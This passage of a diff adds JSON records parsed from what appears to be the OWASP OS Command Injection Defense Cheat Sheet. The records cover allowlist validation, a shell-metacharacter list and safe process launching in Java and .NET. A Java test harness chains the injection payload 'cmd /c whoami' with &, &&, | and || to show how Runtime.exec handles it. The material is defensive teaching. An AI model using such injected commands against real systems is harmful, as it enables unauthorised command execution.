+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00035",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 35,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "**Input validation:** The values for commands and the relevant arguments should be both validated. There are different degrees of validation for the actual command and its arguments:",
+    "text_hash": "60da3bb02fa5a1b7cf5d484949ac09e5ae21a5ce03c97a97297acabf1361ddc5",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 81,
+      "end_line": 81
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 2"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00036",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 36,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- When it comes to the **commands** used, these must be validated against a list of allowed commands.\n- In regards to the **arguments** used for these commands, they should be validated using the following options:\n    - **Positive or allowlist input validation**: Where are the arguments allowed explicitly defined.\n    - **Allowlist Regular Expression**: Where a list of good, allowed characters and the maximum length of the string are defined. Ensure that metacharacters like ones specified in `Note A` and whitespaces are not part of the Regular Expression. For example, the following regular expression only allows lowercase letters and numbers and does not contain metacharacters. The length is also being limited to 3-10 characters: `^[a-z0-9]{3,10}$`\n- For commands that support it, use `--` to end option parsing. In [curl](https://curl.se/docs/manpage.html#OPTIONS), later arguments are still URL operands: `--` does not prevent additional transfers. Pass exactly one validated URL as one argument using a process API, and disable curl's [URL globbing](https://curl.se/docs/manpage.html#GLOBBING) with `--globoff`. Do not interpolate an unquoted value into a shell command. Argument separation does not validate the destination; apply [SSRF protections](Server_Side_Request_Forgery_Prevention_Cheat_Sheet.md).\n",
+    "text_hash": "629f9fd286c37bfd8a488fc362e94524862e418ad2642282f127b17b5e4d73c4",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 83,
+      "end_line": 88
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 2"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00037",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 37,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "**Note A:**",
+    "text_hash": "187755582b329e6fd9f1af73a2eaff18630173524b6328ad2ea0c7686dd62ec2",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 89,
+      "end_line": 89
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 2"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00038",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 38,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\n& |  ; $ > < ` \\ ! ' \" ( )\n```",
+    "text_hash": "b1ced59e4f7d11f128bce8c928a62eab933455054c76976243445ccdd6979017",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 91,
+      "end_line": 93
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 2"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00039",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 39,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Additional Defenses",
+    "text_hash": "5506afe55d481328646be94dfe60fe6cbf92b216c35522549c5d36a87dd852f1",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 95,
+      "end_line": 95
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Additional Defenses"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00040",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 40,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "On top of primary defenses, parameterizations, and input validation, we also recommend adopting all of these additional defenses to provide defense in depth.",
+    "text_hash": "15ed3606e84d6cb9a70050ce0d2c196fdb50212d131aa04047b4064daf6ff665",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 97,
+      "end_line": 97
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Additional Defenses"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00041",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 41,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "These additional defenses are:",
+    "text_hash": "c54a59e66b976e18b47fe9fa9599c1be0a5e107c9e294adba0afb4a39ccd8bd9",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 99,
+      "end_line": 99
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Additional Defenses"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00042",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 42,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- Applications should run using the lowest privileges that are required to accomplish the necessary tasks.\n- If possible, create isolated accounts with limited privileges that are only used for a single task.\n",
+    "text_hash": "e49ed340b87be23fc207b41aa405a8bf9771943919277c988c21cdcb44965191",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 101,
+      "end_line": 103
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Additional Defenses"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00043",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 43,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Code examples",
+    "text_hash": "43d44dbc57d818311d551ad4bb18642dec8cdf1dccd63d92b41bb5eb09be867d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 104,
+      "end_line": 104
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00044",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 44,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Java",
+    "text_hash": "2485230a2c62e665a7ab3fccd77b7b49cce3f306e1af987991f33725e105636b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 106,
+      "end_line": 106
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00045",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 45,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "In Java, use [ProcessBuilder](https://docs.oracle.com/javase/8/docs/api/java/lang/ProcessBuilder.html) and the command must be separated from its arguments.",
+    "text_hash": "d42dd9db2f6c775f0abf23bfb8eadd478068f343b0bdb86e93df44636e20e2f0",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 108,
+      "end_line": 108
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00046",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 46,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "`Runtime.exec(String)` is [deprecated since Java 18](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/Runtime.html) as error-prone: it splits the command String into tokens on whitespace only, so an argument that contains a space is broken into several tokens, which is how untrusted input can add extra arguments (see [Argument Injection](#argument-injection)). Use `ProcessBuilder` or `Runtime.exec(String[])` instead, passing the program and each argument as separate elements. Separating the arguments does not replace validating them.",
+    "text_hash": "e1784000a98ae296b4a9e5f5c4a16aaac39e2c6ef503f18afab91361cd41a897",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 110,
+      "end_line": 110
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00047",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 47,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "*Note about the behavior of Java's `Runtime.exec(String)` method:*",
+    "text_hash": "6ebea4fb56670d78e105ccc7b18d9e66fb62a1ac43848ce5a9dc3f2e36c72ca9",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 112,
+      "end_line": 112
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00048",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 48,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "There are many sites that will tell you that Java's `Runtime.exec` is exactly the same as `C`'s system function. This is not true. Both allow you to invoke a new program/process.",
+    "text_hash": "18f30ee241466dc577b069c75afc983dcb860f73322565ff4e55ec84197a585f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 114,
+      "end_line": 114
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00049",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 49,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "However, `C`'s system function passes its arguments to the shell (`/bin/sh`) to be parsed, whereas `Runtime.exec(String)` tries to split the string into an array of words, then executes the first word in the array with the rest of the words as parameters.",
+    "text_hash": "b41069b24731192ed97c3e784a43ac3ddd692e88f53f67e4ea204bb31c362e3d",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 116,
+      "end_line": 116
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00050",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 50,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "**`Runtime.exec(String)` does NOT try to invoke the shell at any point and does not support shell metacharacters**.",
+    "text_hash": "f4626421f7b801b1c363ef03e0a25f64cbae8ac1382116091d971337271311ad",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 118,
+      "end_line": 118
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00051",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 51,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The key difference is that much of the functionality provided by the shell that could be used for mischief (chaining commands using  `&`, `&&`, `|`, `||`, etc,  redirecting input and output) would simply end up as a parameter being passed to the first command, likely causing a syntax error or being thrown out as an invalid parameter.",
+    "text_hash": "53b7888cf78b8246e81a6c22d1271592d0c6c127aa23b121b7ac9c9443f7b4bd",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 120,
+      "end_line": 120
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00052",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 52,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "*Code to test the note above:*",
+    "text_hash": "2aaecffc0662f56331f90cf09e02c027c29209d92c7354579533de9a62a84a91",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 122,
+      "end_line": 122
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00053",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 53,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "``` java\nString[] specialChars = new String[]{\"&\", \"&&\", \"|\", \"||\"};\nString payload = \"cmd /c whoami\";\nString cmdTemplate = \"java -version %s \" + payload;\nString cmd;\nProcess p;\nint returnCode;\nfor (String specialChar : specialChars) {\n    cmd = String.format(cmdTemplate, specialChar);\n    System.out.printf(\"#### TEST CMD: %s\\n\", cmd);\n    p = Runtime.getRuntime().exec(cmd);\n    returnCode = p.waitFor();\n    System.out.printf(\"RC    : %s\\n\", returnCode);\n    System.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                      \"utf-8\"));\n    System.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                      \"utf-8\"));\n}\nSystem.out.printf(\"#### TEST PAYLOAD ONLY: %s\\n\", payload);\np = Runtime.getRuntime().exec(payload);\nreturnCode = p.waitFor();\nSystem.out.printf(\"RC    : %s\\n\", returnCode);\nSystem.out.printf(\"OUT   :\\n%s\\n\", IOUtils.toString(p.getInputStream(),\n                  \"utf-8\"));\nSystem.out.printf(\"ERROR :\\n%s\\n\", IOUtils.toString(p.getErrorStream(),\n                  \"utf-8\"));\n```",
+    "text_hash": "8f298c9bf12d570afe6a7ea02927441d66b1cefa260a86c8743bcf0580bc2d69",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 124,
+      "end_line": 150
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": "java",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00054",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 54,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "*Result of the test:*",
+    "text_hash": "c7575c68e0df3d32cb2f4333a719182de21ded257d0a323b8a4712d97900fa60",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 152,
+      "end_line": 152
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00055",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 55,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```text\n##### TEST CMD: java -version & cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version && cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version | cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST CMD: java -version || cmd /c whoami\nRC    : 0\nOUT   :\n\nERROR :\njava version \"1.8.0_31\"\n\n##### TEST PAYLOAD ONLY: cmd /c whoami\nRC    : 0\nOUT   :\nmydomain\\simpleuser\n\nERROR :\n```",
+    "text_hash": "5c6884ff1b5a2c4a691c03691873b658a8064f9f4e30e2b1ca03dccf78eadee2",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 154,
+      "end_line": 189
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": "text",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00056",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 56,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "*Incorrect usage:*",
+    "text_hash": "ba4f022193addb19b6eb54cad26a2f43159b1eb6899bae566b865f71132de83c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 191,
+      "end_line": 191
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00057",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 57,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```java\nProcessBuilder b = new ProcessBuilder(\"C:\\\\DoStuff.exe -arg1 -arg2\");\n```",
+    "text_hash": "c02bac9d049739dd58536a771abac03630483ba6f38d7042b4a9f996c17eac04",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 193,
+      "end_line": 195
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": "java",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00058",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 58,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This creates a builder with one command-list element, not a program followed by two arguments. [`ProcessBuilder`](https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/lang/ProcessBuilder.html) represents the executable and its arguments as a list. The snippet does not start a process or demonstrate shell-command injection.",
+    "text_hash": "cc0a323ec4b2f06bc9096031ff71263232608b98394bcb7d6b7c1ffe6428f5c1",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 197,
+      "end_line": 197
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00059",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 59,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "*Correct Usage:*",
+    "text_hash": "faf8635b12c32b4e5688a6cab25413435db802a985d3af35cadee6374d9f584f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 199,
+      "end_line": 199
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00060",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 60,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "This illustrative example starts a process with a modified working directory and passes the executable and each argument separately. Keep the executable and working directory trusted, and validate any untrusted arguments for the invoked program. Argument separation does not replace [argument validation](#layer-2).",
+    "text_hash": "430bb698eaa24577d31877124337da174ac7db598fdff4e55478d7abba1f563b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 201,
+      "end_line": 201
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00061",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 61,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "``` java\nProcessBuilder pb = new ProcessBuilder(\"TrustedCmd\", \"TrustedArg1\", \"TrustedArg2\");\n\nMap<String, String> env = pb.environment();\n\npb.directory(new File(\"TrustedDir\"));\n\nProcess p = pb.start();\n```",
+    "text_hash": "902c045d95354684a966d116c529946735b4a38d8cc0e1cfa3c6f8a4e2141196",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 203,
+      "end_line": 211
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "Java"
+    ],
+    "heading_level": null,
+    "code_language": "java",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00062",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 62,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### .NET",
+    "text_hash": "01f5329741a48ac8a351e142eae64de1406382a1c370cefdfe1008283dcad534",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 213,
+      "end_line": 213
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      ".NET"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00063",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 63,
+    "file_format": "MARKDOWN",
+    "block_type": "list",
+    "text_content": "- If starting a process is necessary, use a fixed, fully qualified executable path in `FileName` and set [`UseShellExecute = false`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute#remarks). This starts the executable directly; it does not validate its arguments.\n- On modern .NET, add each argument separately with [`ProcessStartInfo.ArgumentList`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.argumentlist#remarks). It handles escaping, but untrusted input remains a security risk. Validate each value against the called program's allowed options and operands, such as permitted paths or destinations.\n- Do not pass untrusted input to command interpreters such as `cmd.exe`, `powershell.exe`, or `sh -c`.\n- .NET Framework has no `ArgumentList`. Avoid constructing `Arguments` from untrusted input; if necessary, restrict values to a command-specific allowlist that needs no quoting. [`Arguments` parsing](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.arguments#remarks) depends on the target program and platform.\n",
+    "text_hash": "cb8986101cd01c55d5dcccefe87cd62c48b923088cacd8032c6246f7b2e8ddaa",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 215,
+      "end_line": 219
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      ".NET"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00064",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 64,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### PHP",
+    "text_hash": "1de8835fac689cb82c4725adb1060c330527b5171865432f05328da608b45b6c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 220,
+      "end_line": 220
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Code examples",
+      "PHP"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00065",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 65,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
